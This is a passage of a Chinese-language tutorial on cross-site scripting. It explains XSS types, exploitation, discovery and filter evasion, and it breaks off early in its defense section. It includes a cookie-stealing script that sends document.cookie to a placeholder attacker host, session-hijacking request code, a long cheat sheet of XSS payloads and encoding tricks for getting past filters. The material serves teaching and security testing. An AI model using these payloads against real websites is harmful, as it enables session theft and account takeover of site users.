&lt;p&gt;&lt;strong&gt;&lt;br/&gt;       反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)&lt;br/&gt;&lt;/strong&gt;&lt;br/&gt;       由于篇幅问题，关于反射型XSS我就不做过多简述。&lt;br/&gt;       有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：&lt;a href=&quot;https://xz.aliyun.com/t/3919&quot;&gt;记一次从DOM型XSS到RCE过程&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;存储型xss&quot;&gt;存储型XSS&lt;/h3&gt;
&lt;p&gt;       &lt;strong&gt;存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。--- 《XSS跨站脚本攻击剖析与防御》&lt;/strong&gt;&lt;br/&gt;       存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。---《Web前端黑客技术揭秘》&lt;/p&gt;
&lt;h3 id=&quot;dom型xss&quot;&gt;DOM型XSS&lt;/h3&gt;
&lt;p&gt;       &lt;strong&gt;许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识&lt;br/&gt;       DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在&lt;a href=&quot;https://baike.baidu.com/item/DOM/50288&quot;&gt;百度百科&lt;/a&gt;得到相应的解答。&lt;/strong&gt;&lt;br/&gt;       DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。&lt;br/&gt;       在&lt;strong&gt;刺&lt;/strong&gt;的《白帽子讲Web安全》是这样讲的：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       举个简单的例子(来自《Web前端黑客技术揭秘》)：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;html&amp;gt;
...
&amp;lt;script&amp;gt;
var a=document.URL;
document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));
&amp;lt;/script&amp;gt;
...
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       把以上代码保存为1.html,然后打开浏览器访问&lt;code&gt;http://127.0.0.1/1.html#a=test&lt;/code&gt;&lt;br/&gt;       我们知道这是个静态页面，而且#后边的内容并不会传给服务器。&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2019/03/09/5c839d5c04d33.png&quot; alt=&quot;访问结果&quot;/&gt;&lt;br/&gt;       可是这样就不会产生XSS漏洞了吗？如果我们访问&lt;br/&gt;&lt;code&gt;http://127.0.0.1/.html#a=&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br/&gt;       当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。&lt;br/&gt;       具体执行过程如图：&lt;img src=&quot;https://i.loli.net/2019/03/09/5c83cca814d51.jpg&quot; alt=&quot;来自《黑客攻防技术宝典Web实战篇》&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;xss的利用方式&quot;&gt;4) XSS的利用方式&lt;/h2&gt;
&lt;p&gt;       前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。&lt;/p&gt;
&lt;h3 id=&quot;cookie窃取&quot;&gt;Cookie窃取&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;       Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;会弹出当前页面的cookie信息。&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;       这里我们引入一个叫做“同源策略”的概念：&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面&lt;code&gt;http://www.a.com/index.html&lt;/code&gt;，域名是 &lt;code&gt;www.a.com&lt;/code&gt;，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：&lt;img src=&quot;https://i.loli.net/2019/03/10/5c84907479e30.jpg&quot;/&gt;&lt;br/&gt;       同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。&lt;br/&gt;       除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：&lt;br/&gt;       (1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB&lt;br/&gt;       (2) 无法读写非同源网页的 DOM&lt;br/&gt;       (3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       ————引自&lt;strong&gt;晚风&lt;/strong&gt;表哥在信安之路上的投稿文章&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;amp;mid=2247487543&amp;amp;idx=1&amp;amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=#rd&quot;&gt;《同源策略与跨域请求》&lt;/a&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;       我们知道Cookie有如下常见的属性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Domain————设置关联Cookie的域名;&lt;/li&gt;
&lt;li&gt;Expires————通过给定一个过期时间来创建一个持久化Cookie;&lt;/li&gt;
&lt;li&gt;Httponly————用于避免Cookie被Javascript访问;&lt;/li&gt;
&lt;li&gt;Name————Cookie的名称;&lt;/li&gt;
&lt;li&gt;Path————关联到Cookie的路径，默认为/;&lt;/li&gt;
&lt;li&gt;Value————读写Cookie的值;&lt;/li&gt;
&lt;li&gt;Secure————用于指定Cookie需要通过安全Socket层传递连接;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;       并且Cookie也可以安装类型分为：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;&lt;/li&gt;
&lt;li&gt;内存Cookie————即储存在内存中，随浏览器的关闭而消失;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;       如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。&lt;br/&gt;       由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况&lt;/p&gt;
&lt;h4 id=&quot;默认&quot;&gt;默认&lt;/h4&gt;
&lt;p&gt;       默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;script&amp;gt;
new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;不同域&quot;&gt;不同域&lt;/h4&gt;
&lt;p&gt;       这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为&lt;strong&gt;本域&lt;/strong&gt;。&lt;br/&gt;       例如有两个网站&lt;code&gt;www.a.com&lt;/code&gt;和&lt;code&gt;test.a.com&lt;/code&gt;且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从&lt;code&gt;test.a.com&lt;/code&gt;获取到&lt;code&gt;www.a.com&lt;/code&gt;的Cookie，可是如果&lt;code&gt;www.a.com&lt;/code&gt;的Cookie值中的domain属性设置为父级域即&lt;code&gt;a.com&lt;/code&gt;，就可以通过&lt;code&gt;test.a.com&lt;/code&gt;的xss漏洞获取到&lt;code&gt;www.a.com&lt;/code&gt;的Cookie值。&lt;/p&gt;
&lt;h4 id=&quot;不同路径&quot;&gt;不同路径&lt;/h4&gt;
&lt;p&gt;       这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在&lt;code&gt;www.a.com/admin/index.php&lt;/code&gt;设置cookie值且不知道path，那么path默认为&lt;code&gt;/admin/&lt;/code&gt;。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有&lt;code&gt;/admin/&lt;/code&gt;目录下的javascipt才能读取前边设置的Cookie。&lt;/p&gt;
&lt;h4 id=&quot;http-only&quot;&gt;Http Only&lt;/h4&gt;
&lt;p&gt;       HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。&lt;/li&gt;
&lt;li&gt;利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)&lt;/p&gt;
&lt;h4 id=&quot;secure&quot;&gt;Secure&lt;/h4&gt;
&lt;p&gt;       Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。&lt;/p&gt;
&lt;h4 id=&quot;p3p&quot;&gt;P3P&lt;/h4&gt;
&lt;p&gt;       HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。&lt;br/&gt;       我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。&lt;/p&gt;
&lt;h5 id=&quot;b域设置a域cookie&quot;&gt;B域设置A域Cookie&lt;/h5&gt;
&lt;p&gt;       在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。&lt;/p&gt;
&lt;h5 id=&quot;加载b域时cookie传入问题&quot;&gt;加载B域时Cookie传入问题&lt;/h5&gt;
&lt;p&gt;       我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。&lt;/p&gt;
&lt;h3 id=&quot;会话劫持&quot;&gt;会话劫持&lt;/h3&gt;
&lt;p&gt;       由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。&lt;br/&gt;       这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;       Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。&lt;br/&gt;       在Session机制中，客户端和服务端也有被其他人利用的可能。&lt;br/&gt;       Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。&lt;br/&gt;       会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过javascript控制DOM对象来发起一个GET请求，如：&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;var img = document.creatElement(&quot;img&quot;);
img.src = &quot;http://www.a.com/del.php?id=1&quot;;
document.body.appendChild(img);&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;通过javascript自动构造隐藏表单并提交(POST)&lt;/li&gt;
&lt;li&gt;通过XMLHttpRequest直接发送一个POST请求&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;       我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。&lt;/p&gt;
&lt;h3 id=&quot;钓鱼&quot;&gt;钓鱼&lt;/h3&gt;
&lt;p&gt;       现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？&lt;/p&gt;
&lt;h4 id=&quot;xss重定向钓鱼&quot;&gt;XSS重定向钓鱼&lt;/h4&gt;
&lt;p&gt;       即从&lt;code&gt;www.a.com&lt;/code&gt;通过xss漏洞跳转到&lt;code&gt;www.b.com&lt;/code&gt;的钓鱼页面上，整个过程变化明显，受害者易察觉。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://www.a.com/index.php?search=&amp;lt;script&amp;gt;document.location.href=&quot;http://www.b.com/index.php&quot;&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;html注入式钓鱼&quot;&gt;HTML注入式钓鱼&lt;/h4&gt;
&lt;p&gt;       通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。&lt;/p&gt;
&lt;h4 id=&quot;iframe&quot;&gt;Iframe&lt;/h4&gt;
&lt;p&gt;       攻击者通过javascript来添加一个新的&lt;code&gt;&amp;lt;Iframe&amp;gt;&lt;/code&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。&lt;/p&gt;
&lt;h2 id=&quot;xss漏洞的挖掘&quot;&gt;5) XSS漏洞的挖掘&lt;/h2&gt;
&lt;p&gt;       就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。&lt;/p&gt;
&lt;h3 id=&quot;白盒审计&quot;&gt;白盒审计&lt;/h3&gt;
&lt;p&gt;       通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;黑盒审计&quot;&gt;黑盒审计&lt;/h3&gt;
&lt;p&gt;       这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。&lt;/p&gt;
&lt;h4 id=&quot;手工检测&quot;&gt;手工检测&lt;/h4&gt;
&lt;p&gt;       首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如&lt;code&gt;&quot;&amp;lt;&amp;gt;&amp;amp;;/':&lt;/code&gt;等，如果连&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;都未过滤/转义，那么该输入点很可能存在XSS漏洞。&lt;br/&gt;       如果&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如&lt;br/&gt;&lt;code&gt;&amp;lt;input name=&quot;xx&quot; value=&amp;lt;?=$query?&amp;gt;&amp;gt;&lt;/code&gt;这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为&lt;code&gt;&amp;lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&amp;gt;&lt;/code&gt;。&lt;br/&gt;       一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;常见标签
&amp;lt;img&amp;gt;标签
利用方式1
&amp;lt;img src=javascript:alert(&quot;xss&quot;)&amp;gt;
&amp;lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&amp;gt;
&amp;lt;img scr=&quot;URL&quot; style='Xss:expression(alert(/xss));'
&amp;lt;!--CSS标记xss--&amp;gt;
&amp;lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&amp;gt;
XSS利用方式2
&amp;lt;img src=&quot;x&quot; onerror=alert(1)&amp;gt;
&amp;lt;img src=&quot;1&quot; onerror=eval(&quot;alert('xss')&quot;)&amp;gt;
XSS利用方式3
&amp;lt;img src=1 onmouseover=alert('xss')&amp;gt;
&amp;lt;a&amp;gt;标签
标准格式
&amp;lt;a href=&quot;https://www.baidu.com&quot;&amp;gt;baidu&amp;lt;/a&amp;gt;
XSS利用方式1
&amp;lt;a href=&quot;javascript:alert('xss')&quot;&amp;gt;aa&amp;lt;/a&amp;gt;
&amp;lt;a href=javascript:eval(alert('xss'))&amp;gt;aa&amp;lt;/a&amp;gt;
&amp;lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&amp;gt;aa&amp;lt;/a&amp;gt;
XSS利用方式2
&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
&amp;lt;a href=&quot;&quot; onclick=alert('xss')&amp;gt;aa&amp;lt;/a&amp;gt;
利用方式3
&amp;lt;a href=&quot;&quot; onclick=eval(alert('xss'))&amp;gt;aa&amp;lt;/a&amp;gt;
利用方式4
&amp;lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&amp;gt;aa&amp;lt;/a&amp;gt;
input标签
标准格式
&amp;lt;input name=&quot;name&quot; value=&quot;&quot;&amp;gt;
利用方式1
&amp;lt;input value=&quot;&quot; onclick=alert('xss') type=&quot;text&quot;&amp;gt;
利用方式2
&amp;lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&amp;gt;
利用方式4
&amp;lt;input name=&quot;name&quot; value=&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
&amp;lt;form&amp;gt;标签
XSS利用方式1
&amp;lt;form action=javascript:alert('xss') method=&quot;get&quot;&amp;gt;
&amp;lt;form action=javascript:alert('xss')&amp;gt;
XSS利用方式2
&amp;lt;form method=post action=aa.asp? onmouseover=prompt('xss')&amp;gt;
&amp;lt;form method=post action=aa.asp? onmouseover=alert('xss')&amp;gt;
&amp;lt;form action=1 onmouseover=alert('xss)&amp;gt;
XSS利用方式3
&amp;lt;!--原code--&amp;gt;
&amp;lt;form method=post action=&quot;data:text/html;base64,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&amp;gt;
&amp;lt;!--base64编码--&amp;gt;
&amp;lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;
&amp;lt;iframe&amp;gt;标签
XSS利用方式1
&amp;lt;iframe src=javascript:alert('xss');height=5width=1000 /&amp;gt;&amp;lt;iframe&amp;gt;
XSS利用方式2
&amp;lt;iframe src=&quot;data:text/html,&amp;amp;lt;script&amp;amp;gt;alert('xss')&amp;amp;lt;/script&amp;amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;!--原code--&amp;gt;
&amp;lt;iframe src=&quot;data:text/html;base64,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&amp;gt;
&amp;lt;!--base64编码--&amp;gt;
&amp;lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;
XSS利用方式3
&amp;lt;iframe src=&quot;aaa&quot; onmouseover=alert('xss') /&amp;gt;&amp;lt;iframe&amp;gt;
XSS利用方式3
&amp;lt;iframe src=&quot;javascript&amp;amp;colon;prompt&amp;amp;lpar;`xss`&amp;amp;rpar;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
svg&amp;lt;&amp;gt;标签
&amp;lt;svg onload=alert(1)&amp;gt;
iframe
&amp;lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;——引自&lt;strong&gt;wkend&lt;/strong&gt;的文章&lt;a href=&quot;https://xz.aliyun.com/t/2936&quot;&gt;《XSS小节》&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;工具检测&quot;&gt;工具检测&lt;/h4&gt;
&lt;p&gt;       关于XSS的自动检测软件有许多，如Burp的Scan模块，&lt;a href=&quot;https://github.com/rajeshmajumdar/BruteXSS&quot;&gt;BruteXSS&lt;/a&gt;等，这里不做过多解释。&lt;/p&gt;
&lt;h2 id=&quot;shellcode的绕过&quot;&gt;6) shellcode的绕过&lt;/h2&gt;
&lt;h3 id=&quot;绕过xss-filter&quot;&gt;绕过XSS-Filter&lt;/h3&gt;
&lt;p&gt;       XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。&lt;/p&gt;
&lt;h4 id=&quot;空格回车和tab&quot;&gt;空格回车和Tab&lt;/h4&gt;
&lt;p&gt;       对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将&lt;code&gt;;&lt;/code&gt;作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到&lt;code&gt;;&lt;/code&gt;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字&lt;code&gt;javascript|alert&lt;/code&gt;的过滤：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;img src=javasc
ript:aler
t(/xss/)&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/03/10/5c83f56052a54.png&quot; alt=&quot;IE6下测试成功&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;对标签属性值进行转码&quot;&gt;对标签属性值进行转码&lt;/h4&gt;
&lt;p&gt;       HTML中属性值支持ASCII码形式，如&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;img src=&quot;javascript:alert('xss');&quot;&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       替换成&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;img src=&quot;javascrip&amp;amp;#116&amp;amp;#58alert('xss');&quot;&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       其中在ASCII表中116为&lt;code&gt;t&lt;/code&gt;，58为&lt;code&gt;:&lt;/code&gt;。&lt;br/&gt;       也可以将&lt;code&gt;&amp;amp;#01&lt;/code&gt;,&lt;code&gt;&amp;amp;#02&lt;/code&gt;等插入javascript的头部，还可以将tab(&amp;amp;#09)|换行符(&amp;amp;#10)|回车键(&amp;amp;#13)插入到代码中的任意位置。&lt;/p&gt;
&lt;h4 id=&quot;fuzz标签未过滤事件名&quot;&gt;Fuzz标签未过滤事件名&lt;/h4&gt;
&lt;p&gt;       如&lt;code&gt;&amp;lt;img src=x onerror=alert(/xss/)&amp;gt;&lt;/code&gt;其中的onerror即为IMG标签的一个事件，通常这样的事件都是以&lt;code&gt;on&lt;/code&gt;开头，常见的有:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;onResume
onReverse
onSeek
onSynchRestored
onURLFlip
onRepeat
onPause
onstop
onmouseover&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       除此之外还有很多事件可以利用，这里不再一一列举。&lt;/p&gt;
&lt;h4 id=&quot;使用css绕过&quot;&gt;使用Css绕过&lt;/h4&gt;
&lt;p&gt;       利用Css样式表可以执行javascript的特性，如&lt;br/&gt;       Css直接执行javascript：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;div style=&quot;background-image:url(javascript:alert('xss'))&quot;&amp;gt;
&amp;lt;style&amp;gt;
    body {background-image:url(&quot;javascript:alert('xss')&quot;);}
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       css中使用expression执行javascript:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;div style=&quot;width: expression(alert('xss'))&quot;&amp;gt;
&amp;lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&amp;gt;
&amp;lt;style&amp;gt;
    body {background-image:expression(&quot;alert('xss')&quot;);}
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。&lt;br/&gt;       除了上述两种，还可以利用@import直接执行javascript代码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;style&amp;gt;
    @import 'javascript:alert(&quot;xss&quot;)';
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。&lt;/p&gt;
&lt;h3 id=&quot;扰乱规则&quot;&gt;扰乱规则&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;大小写变换;&lt;/li&gt;
&lt;li&gt;利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;&lt;/li&gt;
&lt;li&gt;结合样式表注释字符/**/，通过css执行javascript&lt;/li&gt;
&lt;li&gt;样式标签会过滤&lt;code&gt;\&lt;/code&gt;和&lt;code&gt;\0&lt;/code&gt;，可以构造如&lt;code&gt;@i\mp\0\0ort 'jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)'&lt;/code&gt;绕过&lt;/li&gt;
&lt;li&gt;Css关键字进行编码处理，如&lt;code&gt;&amp;lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&amp;gt;&lt;/code&gt;其中65为字母e进行unicode编码后的数字部分&lt;/li&gt;
&lt;li&gt;利用浏览器解析注释的问题&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;利用字符编码&quot;&gt;利用字符编码&lt;/h3&gt;
&lt;p&gt;       javascript支持许多的编码格式，如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;unicode&lt;/li&gt;
&lt;li&gt;escapes&lt;/li&gt;
&lt;li&gt;十六|十|八进制&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力&lt;/strong&gt;&lt;br/&gt;在IE下甚至支持JScript Encode加密后的代码&lt;/p&gt;
&lt;h3 id=&quot;拆分法&quot;&gt;拆分法&lt;/h3&gt;
&lt;p&gt;       如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：&lt;a href=&quot;http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm&quot;&gt;《疯狂的跨站之行》剑心(非原链接)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;xss防御&quot;&gt;7) XSS防御&lt;/h2&gt;
&lt;p&gt;       说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？&lt;/p&gt;
&lt;h3 id=&quot;输入&quot;&gt;输入&lt;/h3&gt;
&lt;p&gt;       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。&lt;/p&gt;
